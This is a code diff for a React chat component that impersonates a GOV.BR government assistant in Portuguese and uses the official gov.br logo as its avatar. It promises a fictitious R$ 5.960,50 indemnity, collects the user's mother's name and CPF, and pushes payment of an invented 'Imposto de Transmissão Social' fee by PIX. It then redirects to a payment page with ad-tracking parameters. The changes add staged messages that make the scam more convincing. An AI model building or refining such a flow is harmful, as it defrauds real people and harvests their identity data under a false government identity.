@@ -34,11 +34,12 @@ interface Message {
 
 interface FlowStepDetails {
   botMessage?: string | ((params: SimulatedChatParams) => string);
-  options?: 
+  options?:
     | { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]
     | ((params: SimulatedChatParams) => { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]);
-  nextStepAfterVideo?: keyof typeof flowDefinition; // For video step
-  isRedirectStep?: boolean; // For payment redirect
+  nextStepAfterVideo?: keyof typeof flowDefinition;
+  nextStepAfterMessage?: keyof typeof flowDefinition; // New: For auto-proceeding after a message
+  isRedirectStep?: boolean;
 }
 
 interface FlowDefinition {
@@ -49,16 +50,30 @@ interface FlowDefinition {
 const flowDefinition: FlowDefinition = {
   intro_video: {
     botMessage: "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
-    nextStepAfterVideo: 'start',
+    nextStepAfterVideo: 'start_greeting',
   },
-  start: {
-    botMessage: (params: SimulatedChatParams) => `Olá ${params.nome || 'usuário'}! Para começarmos, por favor, confirme o nome da sua mãe:`,
-    options: (params: SimulatedChatParams) => [
-      { text: params.mae || "Nome da Mãe (Não informado)", value: 'confirm_mae', nextStep: 'ask_question_1' },
-      { text: "Informar outro nome", value: 'other_mae', nextStep: 'ask_mae_again' },
+  start_greeting: {
+    botMessage: (params: SimulatedChatParams) => `Olá ${params.nome || 'usuário'}!`,
+    nextStepAfterMessage: 'start_message_1',
+  },
+  start_message_1: {
+    botMessage: "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.",
+    nextStepAfterMessage: 'start_message_2',
+  },
+  start_message_2: {
+    botMessage: "Responda às perguntas a seguir para aprovação do seu saque de R$ 5.960,50.",
+    nextStepAfterMessage: 'start_prompt_mae',
+  },
+  start_prompt_mae: { // This was the original 'start'
+    botMessage: "Por favor, confirme o nome de sua mãe.",
+    options: [
+      { text: "Raquel Queiroz Santos", value: 'raquel_qs', nextStep: 'ask_mae_again' },
+      { text: "Fernanda de Sousa Rodrigues", value: 'fernanda_sr', nextStep: 'ask_mae_again' },
+      { text: "Eliane Da Silva Moreira", value: 'eliane_sm_correct', nextStep: 'ask_question_1' },
+      { text: "Nenhuma das alternativas.", value: 'nenhuma_mae', nextStep: 'ask_mae_again' }
     ],
   },
-  ask_mae_again: { 
+  ask_mae_again: {
     botMessage: "Por favor, digite o nome completo da sua mãe.",
     options: [{text: "Ok, entendi (simulação)", value: 'mae_understood', nextStep: 'ask_question_1'}]
   },
@@ -86,7 +101,7 @@ const flowDefinition: FlowDefinition = {
       { text: "Saber mais sobre a taxa", value: 'info_taxa', nextStep: 'explain_tax_briefly' },
     ],
   },
-  explain_tax_briefly: { 
+  explain_tax_briefly: {
     botMessage: "A taxa de Imposto de Transmissão Social (ITS) é um valor simbólico obrigatório para cobrir custos operacionais e garantir a segurança da transação e a liberação do seu benefício. O pagamento é processado de forma segura pela plataforma GOV.BR.",
     options: [
         { text: "Entendi, desejo pagar com PIX (CPF)", value: 'pix_cpf_after_explain', nextStep: 'confirm_cpf'},
@@ -101,7 +116,7 @@ const flowDefinition: FlowDefinition = {
       { text: "Não, desejo alterar.", value: 'cpf_incorreto', nextStep: 'handle_cpf_correction' },
     ],
   },
-  handle_cpf_correction: { 
+  handle_cpf_correction: {
     botMessage: "Entendido. Para corrigir seu CPF, por favor, reinicie o processo ou entre em contato com o suporte.",
     options: [{ text: "Ok", value: 'cpf_correction_ack', nextStep: 'end_chat_early' }]
   },
@@ -126,7 +141,7 @@ const flowDefinition: FlowDefinition = {
       { text: "Ainda tenho dúvidas.", value: 'more_doubts', nextStep: 'support_contact' },
     ],
   },
-  support_contact: { 
+  support_contact: {
     botMessage: "Para mais informações, por favor, acesse a seção de Ajuda no portal GOV.BR ou entre em contato com nosso suporte.",
     options: [{ text: "Ok", value: 'support_ack', nextStep: 'end_chat_early' }]
   },
@@ -179,13 +194,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
     }
     
     setIsBotTyping(true);
-    // Clear previous messages only if it's not the intro video step coming from itself (e.g. after video click)
-    // or if it's the very first message of intro_video
-    if (currentStep !== 'intro_video' || (currentStep === 'intro_video' && messages.length === 0)) {
-        // This logic might need refinement if we want to keep the intro video message always visible before chat starts
-    }
-
-
+    
     setTimeout(() => {
       let botText = "";
       if (typeof stepConfig.botMessage === 'function') {
@@ -197,25 +206,35 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
       const newMessageId = `bot-${Date.now()}`;
       const botMsg: Message = { id: newMessageId, sender: 'bot', text: botText };
       
+      let shouldAddMessage = !!botText;
+
       if (stepConfig.options) {
          if (typeof stepConfig.options === 'function') {
             botMsg.options = stepConfig.options(initialParams);
          } else {
             botMsg.options = stepConfig.options;
          }
+         shouldAddMessage = true; 
       }
       
-      if (botText || botMsg.options || currentStep === 'intro_video') {
-        // For intro_video, add message even if only video is shown (text is separate)
-         if (currentStep === 'intro_video' && messages.find(m => m.text === stepConfig.botMessage)) {
-            // Message already added, do nothing more for text part
-        } else if (botText || botMsg.options) {
-             setMessages(prev => [...prev, botMsg]);
+      if (shouldAddMessage && currentStep !== 'intro_video') { 
+        setMessages(prev => [...prev, botMsg]);
+      } else if (currentStep === 'intro_video' && botText) {
+        // Ensure intro_video message is added if defined (it's handled once)
+        if (!messages.find(m => m.text === botText && m.sender === 'bot')) {
+            setMessages(prev => [...prev, {id: `bot-intro-${Date.now()}`, sender: 'bot', text: botText }]);
         }
       }
+      
       setIsBotTyping(false);
 
-    }, 1000); 
+      if (stepConfig.nextStepAfterMessage && !stepConfig.options) {
+        setTimeout(() => { 
+            setCurrentStep(stepConfig.nextStepAfterMessage as keyof typeof flowDefinition);
+        }, 1200); 
+      }
+
+    }, 700); // Shorter delay for bot "typing" simulation
 
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [currentStep, initialParams]);
@@ -230,7 +249,9 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
     if (initialParams.utm_content) queryParams.set('utm_content', initialParams.utm_content);
     if (initialParams.utm_medium) queryParams.set('utm_medium', initialParams.utm_medium);
     if (initialParams.utm_source) queryParams.set('utm_source', initialParams.utm_source);
-    
+    // utm_term is often part of these, let's add it as empty if not present or handle it if it becomes a param
+    queryParams.set('utm_term', initialParams.gclid || ''); // Using gclid as a proxy or ensure it's available
+
     const finalUrl = `${basePaymentUrl}?${queryParams.toString()}`;
     window.location.href = finalUrl;
   };
@@ -238,7 +259,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
   const handleOptionClick = (optionValue: string, nextStepKey?: keyof typeof flowDefinition) => {
     const userMessageId = `user-${Date.now()}`;
     const currentStepConfig = flowDefinition[currentStep];
-    let userMessageText = optionValue; 
+    let userMessageText = optionValue;
 
     if (currentStepConfig?.options) {
         let currentOptions: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[] = [];
@@ -257,27 +278,19 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
 
     if (nextStepKey) {
       setCurrentStep(nextStepKey);
-    } else {
-      // Fallback or error if no next step defined
     }
   };
   
   const handleVideoThumbnailClick = async () => {
     if (playerRef.current?.plyr) {
       try {
-        playerRef.current.plyr.muted = false; 
-        await playerRef.current.plyr.play(); 
+        playerRef.current.plyr.muted = false;
+        await playerRef.current.plyr.play();
         setShowVideoThumbnailOverlay(false);
         
         const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
         if (nextStep) {
-          // Add the intro message if not already present (or re-add if cleared)
-          const introMsgText = flowDefinition.intro_video.botMessage as string;
-          if (!messages.find(m => m.text === introMsgText && m.sender === 'bot')) {
-            const msgId = `bot-intro-${Date.now()}`;
-            setMessages(prev => [...prev, {id: msgId, sender: 'bot', text: introMsgText }]);
-          }
-          // Transition to the chat flow after a short delay to let user see video start
+          // No need to re-add intro message, it's handled by the step itself now
           setTimeout(() => {
             setCurrentStep(nextStep);
           }, 500);
@@ -285,11 +298,11 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
       } catch (error) {
         console.error("Error trying to play/unmute video:", error);
         const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
-        if (nextStep) setCurrentStep(nextStep); // Proceed even if video fails
+        if (nextStep) setCurrentStep(nextStep);
       }
     } else {
         const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
-        if (nextStep) setCurrentStep(nextStep); // Proceed if player not ready
+        if (nextStep) setCurrentStep(nextStep);
     }
   };
 
@@ -332,15 +345,13 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
       )}
 
       {messages.map((msg) => (
-        // Render only non-intro_video messages here if intro_video has its own section
-        (currentStep !== 'intro_video' || msg.text !== flowDefinition.intro_video.botMessage) && (
           <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
             {msg.sender === 'bot' && (
               <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
             )}
             <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
               {msg.text}
-              {msg.sender === 'bot' && msg.options && !isBotTyping && currentStep !== 'intro_video' && (
+              {msg.sender === 'bot' && msg.options && !isBotTyping && (
                 <div className="options-container" style={{ marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                   {msg.options.map(opt => (
                     <button
@@ -356,8 +367,8 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
             </div>
           </div>
         )
-      ))}
-      {isBotTyping && (currentStep !== 'intro_video' || messages.length === 0) && (
+      )}
+      {isBotTyping && (
          <div className="message-container bot-message-container">
             <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
             <div className="message bot-message typing-indicator">
